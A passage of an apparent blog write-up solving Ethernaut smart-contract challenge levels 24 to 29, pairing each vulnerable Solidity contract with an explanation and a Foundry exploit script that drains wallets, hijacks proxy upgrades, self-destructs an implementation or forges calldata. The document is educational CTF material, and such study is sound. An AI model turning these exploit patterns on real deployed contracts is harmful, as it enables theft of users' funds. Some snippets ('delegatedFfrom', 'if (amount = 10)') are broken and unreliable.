11. We can use the `multicall()` function to do this, we call the `multicall()` with 0.001 ether and pass the function signature of the `deposit()` so that our balance will become 0.001 ether and balance of wallet will be 0.002 ether.
12. We cant call `deposit()` twice in a single call by passing calldata as [signature of `deposit` + signature of `deposit`]. As there is a check to catch this case.
13. But we can send the singature of the `deposit()` and a call to `multicall()` again with the `deposit()` signature.
14. That is we are calling multicall with a `deposit()` calldata along with multicall calldata with `deposit()` signature. i.e, a nested multicall.
15. This will modify the `balance[msg.sender]` twice so that it will become 0.00 ether, but the actual wallet balance is 0.002.
16. Now we have enough `balance[msg.sender]` to pass the check done in `execute()` function.
17. So, now we can withdraw 0.002 ether from wallet, therefore the wallet balance becomes `zero`.

**Level24Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Level24.sol";

contract Level24Sol is Script {
    PuzzleProxy public proxy =
        PuzzleProxy(payable(0x5415eC6D56a799978BdEd9166328De045f52366D));
    PuzzleWallet public wallet =
        PuzzleWallet(0x5415eC6D56a799978BdEd9166328De045f52366D);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Wallet Owner  :", wallet.owner());
        console.log("Proxy Admin :", proxy.admin());
        console.log("Wallet Max Balance : ", wallet.maxBalance());
        console.log("Proxy Pending Admin : ", proxy.pendingAdmin());
        console.log("Wallet balance : ", address(wallet).balance);

        Attack attack = new Attack();

        attack.exploit{value: 0.001 ether}();

        console.log("Wallet Owner  :", wallet.owner());
        console.log("Proxy Admin :", proxy.admin());
        console.log("Wallet Max Balance : ", wallet.maxBalance());
        console.log("Proxy Pending Admin : ", proxy.pendingAdmin());
        console.log("Wallet balance : ", address(wallet).balance);

        vm.stopBroadcast();
    }
}

contract Attack {
    PuzzleProxy public proxy =
        PuzzleProxy(payable(0x5415eC6D56a799978BdEd9166328De045f52366D));
    PuzzleWallet public wallet =
        PuzzleWallet(0x5415eC6D56a799978BdEd9166328De045f52366D);

    function exploit() public payable {
        proxy.proposeNewAdmin(address(this));

        wallet.addToWhitelist(address(this));

        bytes[] memory _depositData = new bytes[](1);
        _depositData[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = _depositData[0];
        data[1] = abi.encodeWithSelector(
            wallet.multicall.selector,
            _depositData
        ); // nested multicalling

        wallet.multicall{value: 0.001 ether}(data);

        wallet.execute(address(this), 0.002 ether, "");

        wallet.setMaxBalance(
            uint256(
                uint160(address(0x2e118e720e4142E75fC79a0f57745Af650d39F94))
            )
        );
    }

    receive() external payable {}
}

```

**To run the script**

```
$ source .env
$ forge script script/Level24Solution.s.sol:Level24Sol --rpc-url $RPC_URL --broadcast
```

## Motorbike

**Level25.sol**

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")//we can able to call the initialize() again since it is a delegate call.
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}
/*
*/
contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

//this initializer modifier prevents the function from being  calling twice.
    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

**Goal:**

Would you be able to selfdestruct its engine and make the motorbike unusable ?

**Explanation:**

1. This is another upgradeable proxy contract setup. Motorbike contract is the proxy contract which forwards the calls to the implementation contract Engine.
2. This time no storage collison is happened.
3. We need to change the `upgrader` of the Engine contract and `selfdestruct` the Engine contract.
4. We have to write an Attack contract which has the selfdestruct function and change the implementation address.
5. We see only one time the `upgrader` was assigned inside Engine contract, that is inside `initialize()` function. And this initialize function was called inside the constructor of the Motobike.
6. But observe that this call was done using `delegatecall`, which is done in the context of the Motorbike. Not the Engine contract.
7. This means the `initialize()` function can be called again as the `intializer` modfier not updated.
8. By calling `intialize()`, we will become the upgrader of the Engine contract.
9. Now, we can update the implementation addres by calling `upgradeToAndCall()` function and pass the data as the signature of the `destructEngine()` function to be called by the Engine contract.
10. This will destruct the Engine contract, because the call was done using `delegatecall` so the storage of the Engine will be affected.

**Level25Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Level25.sol";

contract Level25Sol is Script {
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    Motorbike instance = Motorbike(0x20072a9B2075f613965e9AE956de56E2d68A45B2);

    Engine engineAddress =
        Engine(
            address(
                uint160(
                    uint256(vm.load(address(instance), _IMPLEMENTATION_SLOT))
                )
            )
        );

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log(address(engineAddress));
        new Attack().exploit(address(engineAddress));

        vm.stopBroadcast();
    }
}

contract Attack {
    Engine public engine;

    function exploit(address _engine) public {
        engine = Engine(_engine);

        engine.initialize();

        console.log(engine.upgrader());

        bytes memory killSelector = abi.encodeWithSelector(this.kill.selector);

        engine.upgradeToAndCall(address(this), killSelector);
    }

    function kill() external {
        selfdestruct(payable(address(this)));
    }

    receive() external payable {}
}

```

**To run the script**

```
$ source .env
$ forge script script/Level25Solution.s.sol:Level25Sol --rpc-url $RPC_URL --broadcast
```

## Double Entry Point

**Level26.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "openzeppelin-contracts-06/access/Ownable.sol";
import "openzeppelin-contracts-06/token/ERC20/ERC20.sol";

interface DelegateERC20 {
    function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;

    function notify(address user, bytes calldata msgData) external;

    function raiseAlert(address user) external;
}

contract Forta is IForta {
    mapping(address => IDetectionBot) public usersDetectionBots;
    mapping(address => uint256) public botRaisedAlerts;

    function setDetectionBot(address detectionBotAddress) external override {
        usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
    }

    function notify(address user, bytes calldata msgData) external override {
        if (address(usersDetectionBots[user]) == address(0)) return;
        try usersDetectionBots[user].handleTransaction(user, msgData) {
            return;
        } catch {}
    }

    function raiseAlert(address user) external override {
        if (address(usersDetectionBots[user]) != msg.sender) return;
        botRaisedAlerts[msg.sender] += 1;
    }
}

contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying; //doubleentrypoint

    constructor(address recipient) {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate; //delegate is doublEntry  point  contract itself.

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(
        address to,
        uint256 value
    ) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}

contract DoubleEntryPoint is
    ERC20("DoubleEntryPointToken", "DET"),
    DelegateERC20,
    Ownable
{
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(
        address legacyToken,
        address vaultAddress,
        address fortaAddress,
        address playerAddress
    ) {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if (forta.botRaisedAlerts(detectionBot) > previousValue)
            revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);
        return true;
    }
}

```

**Goal:**

Drain the underlying token balance of CryptoVault and Write a detection bot to catch this bug.

**Explanation:**

1. There are four contracts in total `CryptoVault`, `DoubleEntryPoint`, `LegacyToken` and `Forta`.
2. CryptoVault implemented `sweepToken()` function which allows us to sweep all the tokens from the CryptoVault except the `underlying` tokens.
3. The underlying token is an instance of the DET token implemented in the DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it. Additionally the CryptoVault also holds 100 of LegacyToken LGT.
4. LegacyToken is simple ERC20 token which is already deployed and minted 100 tokens for the CryptoVault.
5. `LegacyToken` also has function `transfer()` which is where the bug is,

```solidity
 function transfer(
        address to,
        uint256 value
    ) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
```
6.When I checked, the `delegate` is actually the address of the `DoubleEntryPoint` and  it is assigned to delegate in LegacyToken contract.

<img src="/images/Untitled.png" class="autoimg">


```
 foundry command: $ cast 4 0xc89e4361
 Output:          delegate()
```

7.Here the `delegate` == `DET` address. Which means the LegacyToken contract is calling the `delegateTransfer()` function of `DoubleEntryPoint` contract. See the `delegateTransfer()` function below and observe what it is doing.

```solidity
 function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);
        return true;
    }
```
8.Its sending the `DET` tokens to the `to` address from the `origSender` of `value`.

9.When this function executes it transfers DET tokens of `origSender` to the `to` address. `CryptoVault` holds 100 DET tokens.

10.So, if the `origSender` is CryptoVault and the call to `delegateTransfer()` was made by `LegacyToken` and no alerts from the `fortaNotify` will transfer DET tokens from CryptoVault. (Ignore fortaNotify as they are not yet implmented)

11.The `delegateTransfer()` is called by LegacyToken contract from the `transfer()` function. The `origSender` is the `msg.sender` of transfer() function in LegacyToken.

12.So, we have to make the CryptoVault to call the `transfer()` function of the LegacyToken.

13.We see the one `transfer()` call is made on the `token` by CryptoVault inside `sweepToken()` function.

```solidity
function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
```

14.To make the LegacyToken `tranfer()` called by the CryptoVault, we need to pass the LegacyToken instance to the `sweepToken()` function.

15.Now the `CryptoVault` balance of DET token becomes zero.

16.We identified the bug and sweeped out the DET tokens of the CryptoVault.

17.Now we have to write a `detectionbot` to catch this bug. We are given with `Forta` interface which can be used to build the bot.

18.We have to build a bot that raises an alert when we see any transaction that transfers DET tokens from CryptoVault.

19.The `msg.data` that received at `fortNotify()`

```
data = <delegateTransfer() signature> <to> <value> <origSender>
```

20.If we access `msg.data` inside `handleTransaction()`,

```
msg.data = <handleTransaction() signature> <user> <data>
```

21.We need to extract `origSender` from the `msg.data` inside `handleTransaction()` function implemented in our bot contract.

22.Lets see how the calldata at `handleTransaction()` is looks like,

```
0x00 : handleTransaction signature[4 bytes]
0x04 : 0000....0000 // <user> address  
0x24 : 0000....0000 // offset of the <data> 
0x44 : 0000....0000 // length of the <data>
---------start of the data---------
0x64 : <delegateTransfer() signature> [4 bytes]
0x68 : 0000....0000 // <to> address
0x88 : 0000....0000 // <value>
0xA8 : 0000....0000 // <origSender>           
```

23.So, the `origSender` is from the `0xA8` byte of the `msg.data` inside `handleTransaction()` function.

24.We can use `calldataload` opcode to access the `origSender`. And if the origSender is equals to CryptoVault then raise an alert.

25.Now the bot is ready, we have to deploy it and register the bot at `Forta` contract.


**Level26Solution.s.sol**

```solidity
//SPDX-License-Identifier :MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Level26.sol";

contract Level26Sol is Script{

    DoubleEntryPoint public dep = DoubleEntryPoint(0xcE33ED049f763622a132480D7348B212777Ee61E);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address cryptoVault = dep.cryptoVault();
        address player = dep.player();
        address delegatedFrom = dep.delegatedFrom();

        console.log("CryptoVault is ",cryptoVault);
        console.log("Player is ",player);
        console.log("LegacyToken is ",delegatedFrom);

        LegacyToken lgt = LegacyToken(delegatedFrom);
        CryptoVault cv = CryptoVault(cryptoVault);

        console.log("Balance of DET in CryptoVault", dep.balanceOf(cryptoVault));
        console.log("Balance of LGT in CryptoVault", lgt.balanceOf(cryptoVault));

        console.log("The following two address are same");
        console.log("Delegate of Legacytoken contract",address(lgt.delegate()));
        console.log("DET :", address(dep));

        Forta forta = dep.forta();

        //registering bot
        DetectionBot bot = new DetectionBot();
        forta.setDetectionBot(address(bot));

        console.log("BOT ALERTS Before  exploit :", forta.botRaisedAlerts(address(bot)));
        
        new Attack().exploit(); //reverted by bot when it tries to exploit

        console.log("Cryptovault balance of DET :", dep.balanceOf(cryptoVault));
        console.log("BOT alerts after exploit: ",forta.botRaisedAlerts(address(bot)));

        vm.stopBroadcast();

    }
}

contract Attack{

    DoubleEntryPoint public dep = DoubleEntryPoint(0xcE33ED049f763622a132480D7348B212777Ee61E);
    address public cryptoVault = dep.cryptoVault();
    address public delegatedFrom = dep.delegatedFrom();

    function exploit() public {
        CryptoVault cv = CryptoVault(cryptoVault);
        cv.sweepToken(IERC20(delegatedFfrom));
    }
}

contract DetectionBot{
    DoubleEntryPoint public dep = DoubleEntryPoint(0xcE33ED049f763622a132480D7348B212777Ee61E);
    address public  cryptoVault = dep.cryptoVault();

    function handleTransaction(address user, bytes calldata msgData)external{

        address origSender;
        assembly{
            origSender:=  calldataload(0xa8)
        }

        if(origSender == cryptoVault){
            Forta(msg.sender).raiseAlert(user);
        }
    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level26Solution.s.sol:Level26Sol --rpc-url $RPC_URL --broadcast
```

## Good Samaritan

**Level27.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts/contracts/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            //if(dest_.isContract()) { 
            if (dest_.code.length != 0){
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

**Goal:**

Would you be able to drain all the balance from his Wallet?

**Explanation:**

1. There in total three contract are given to us. `GoodSamaritan` contract deployes `Wallet` and `Coin` contracts.
2. Good samaritan will be the `owner` of the `Wallet` contract. And the wallet contract will have 10**6 Coin balances.
3. We are given with the GoodSamaritan instance address. We can able to call the `requestDonation()` function to get 10 coins from the GoodSamaritan’s Wallet.
4. One call to `requestDonation()` will get 10 coins only. To drain all the coins of the Wallet we need to call the `requestDonation()` function `100000` times which requires more gas.
5. Instead we can try to invoke the `withdrawRemainder()` function which will send all the coins at a time.
6. The `withdrawRemainder()` is called when the `wallet.donate10(msg.sender)` returns error `NotEnoughBalance()` defined inside Wallet contract.
7. GoodSamaritan contract expects the error from the Wallet contract only. But as per the solidity docs, the error may be raised and bubbled up by any intermediary contract. That means we cannot predict the origin of the error.
8. So, can we raise error by ourself to the GoodSamaritan..? yes, When transfering 10 coins to the sender inside the `Coin` contract it notifies the sender if the sender is a contract.
9. This means it calls to our `msg.sender`, now we can implement the `notify()` function inside our Attack contract and revert with the `NotEnoughBalance()` error when receiving the 10 coins.
10. We should revert the `NotEnoughBalance()` error when only receiving the 10 coins not when the GoodSamaritan sending whole coins.
11. For this I used the amount parameter sent by the Coin contract through the notify call.
12. Now GoodSamaritan gets the error `NotEnoughBalance()` when it sends 10 coins to us, immediately it will send whole coins to us.

**Level27Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Level27.sol";

contract Level27Sol is Script {
    GoodSamaritan public instance =
        GoodSamaritan(0x99A5FD376b27d513922E7b0bc36DbBb1941b31F6);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log(
            "Balance of Wallet before attack",
            instance.coin().balances(address(instance.wallet()))
        );

        new Attack().exploit();

        console.log(
            "Balance of Wallet after attack",
            instance.coin().balances(address(instance.wallet()))
        );

        vm.stopBroadcast();
    }
}

contract Attack {
    error NotEnoughBalance();

    GoodSamaritan public instance =
        GoodSamaritan(0x99A5FD376b27d513922E7b0bc36DbBb1941b31F6);

    function exploit() public {
        instance.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount = 10) {
            // only revert when receiving 10 coins
            revert NotEnoughBalance();
        }
    }
}

```

**To run the script**

```
$ source .env
$ forge script script/Level27Solution.s.sol:Level27Sol --rpc-url $RPC_URL --broadcast
```

## Gatekeeper Three

**Level28.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```

**Goal:**

Cope with gates and become an entrant.

**Explanation:**

1. Similar to GatekeeperOne and GatekeeperTwo we need to pass the three gate checks by the modifiers when calling the `enter()` function.
2. `gateOne()` can be bypassed if we are the owner of the contract and we need call from a contract.
3. To be be the owner we can call the `construct0r()` function its not the actual constructor(), so we can be the owner after calling it.
4. `gateTwo()` will be passed if we managed to change the `allowEntrance` value to true. To do it, we need to call the `getAllowance()` function with the right password defined inside SimpleTrick contract.
5. So, we need to deploy a SimpleTrick contract first, we can do this by calling `createTrick()` function.
6. After that we need to find the password stored inside SimpleTrick contract. We can do this by using `vm.load` cheatcode or we can find the password inside our Attack contract.
7. Because the password is the `block.timestamp` which will be same during a transaction. If we deploy the SimpeToken and get the block.timestamp inside same call, the block.timestamp will be the password for us.
8. Callling `getAllowance()` with this value will pass the gateTwo.
9. For `gateThree()` the balance of the GatekeeperThree should be greater than 0.001 ether and when the GatekeeperThree sends 0.001 ether to owner it should return false.
10. Remember owner is out attack contract, GatekeeperThree sending ether using `send` call. `send` call will return `false` when the transaction fails.
11. So, we have to deny the ether sent by the GatekeeperThree. To do this, I haven’t implemented any fallback or receive function inside my Attack contract.
12. For this reason the send will return false to GatekeeperThree contract and now we will able to register as entrant.

**Level28Solution.s.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Level28.sol";

contract Level28Sol is Script {
    GatekeeperThree public instance = GatekeeperThree(payable(0x1B3158cc2634Fbf84299D79D52a2E63680B63559));
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Gate Owner : ", instance.owner());

        Attack attack = new Attack{value: 0.009 ether}();
        attack.exploit();
        
        console.log("Allow Entrance : ", instance.allowEntrance());
        console.log("Gate keeper Owner : ", instance.owner());
        console.log("Entrant : ", instance.entrant());
        vm.stopBroadcast();
    }
}

contract Attack { 
    GatekeeperThree public instance = GatekeeperThree(payable(0x1B3158cc2634Fbf84299D79D52a2E63680B63559));

    constructor() payable{}
    function exploit() public {

        instance.construct0r();//bypassed first gate

        //bypassing second gate
        instance.createTrick();
        
        // uint256 password = vm.getBlockTimestamp();
        instance.getAllowance(block.timestamp);

        (bool success, ) = payable(address(instance)).call{value : address(this).balance}("");
        require(success, "Tx Failed");

        instance.enter();

    }
}
```

**To run the script**

```
$ source .env
$ forge script script/Level28Solution.s.sol:Level28Sol --rpc-url $RPC_URL --broadcast
```

## Switch

**Level29.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```

**Goal:**

Just have to flip the switch.

**Explanation:**

1. Switch contract has three functions `turnSwitchOff()`, `turnSwitchOn()` and `flipSwitch()`. We can only able to call flipSwitch function.
2. By using this flipSwitch only we have to call the `turnSwitchOn()` function. For this we need to pass the calldata for the function call `turnSwitchOn()`.
3. But If we pass the `turnSwitchOn()` calldata to the `flipSwitch()` it will be reverted by `onlyOff` modifier.
4. Because, onlyOff is checking that the calldata’s 68 to 72 bytes should only contain the signature of the `turnSwitchOff()` function.
5. The vulnerability is present inside the `onlyOff()` modifier as its function signature check byte position is hardcoded (68,4).
6. We can modify the `calldata` in order to bypass the check and as well as call the `turnSwitchOn()` function.
7. When we call a function on a contract, the `calldata` will be sent via the transaction as `msg.data.`
8. Now, we have to send the `turnSwitchOn()` signature along with this `calldata`. And we should make sure that only `turnSwitchOn()` signature should be passed to the `call` inside `flipSwitch()`.
9. The data which is used inside the function will be specified by the `offset`. The function will make use of the actual data that is pointed by the offset.
10. As the `onlyOff` modifier uses the hardcoded check, we can modify the calldata to be able to insert the `turnSwitchOff()` function signature at the 68th bytes and append the `turnSwitchOn()` signature.
11. Now we have to change the offset of the calldata in such a way that it points to the `turnSwitchOn()` signature.

```
calldata to bypass onlyOff
  => <flipSwitch Singature> <Offset> <Dummy Data> <turnSwitchOff Signature> <length of data> <turnSwitchOn Signature>
  
  30c13ade - flipSwitch(bytes)  
     
[000]: 0000000000000000000000000000000000000000000000000000000000000060 --offset position for actual data
[020]: 0000000000000000000000000000000000000000000000000000000000000000 --adding dummy bytes to bypass the check
[040]: 20606e1500000000000000000000000000000000000000000000000000000000 --turnSwitchOff()--ByPassed onlyOff modifier
[060]: 0000000000000000000000000000000000000000000000000000000000000004 --Length of the turnSwitchOff() signature data
[080]: 76227e1200000000000000000000000000000000000000000000000000000000 --turnSwitchOn()-- Won the challenge
```

12.Now this `calldata` will bypasses the check of `onlyOff` and we modified the offset to  point  it to the `turnSwitchOn()` signature.

13.This will call the `turnSwitchOn()` function in Switch contract.

**Level29Solution.s.sol**

```solidity
// SPDX- License-Identifier :MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Level29.sol";

contract Level29Sol is Script{

    Switch public instance  = Switch(0xBAfeeF31f97943fe11de5a04138f1AED8297aBb6);

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes memory data = abi.encodeWithSignature("flipSwitch(bytes)",0x60,
         0x00, 0x20606e1500000000000000000000000000000000000000000000000000000000,0x04,
         0x76227e1200000000000000000000000000000000000000000000000000000000);

        console.logBytes(data);

         address(instance).call(data);
         /*
        
         -----------------------------------------------console.log(data)----------------------------------------
          Possible methods:
            30c13ade      - flipSwitch(bytes)  
            ------------
            [000]: 0000000000000000000000000000000000000000000000000000000000000060 --offset position for actual data
            [020]: 0000000000000000000000000000000000000000000000000000000000000000 --adding dummy bytes to bypass the check
            [040]: 20606e1500000000000000000000000000000000000000000000000000000000 --turnSwitchOff()--ByPassed onlyOff modifier
            [060]: 0000000000000000000000000000000000000000000000000000000000000004 --Length of the turnSwitchOff() signature data
            [080]: 76227e1200000000000000000000000000000000000000000000000000000000 --turnSwitchOn()-- Won the challenge

         */

         console.log("Switch is :", instance.switchOn());

         vm.stopBroadcast();

    }
}
```

**To run the script:**

```
$ source .env
$ forge script script/Level29Solution.s.sol:Level29Sol --rpc-url $RPC_URL --broadcast
```


## References
[Mastering Ethereum](https://github.com/ethereumbook/ethereumbook)<br>
[themj0ln1r's Blog ](https://themj0ln1r.github.io/posts/ethernaut)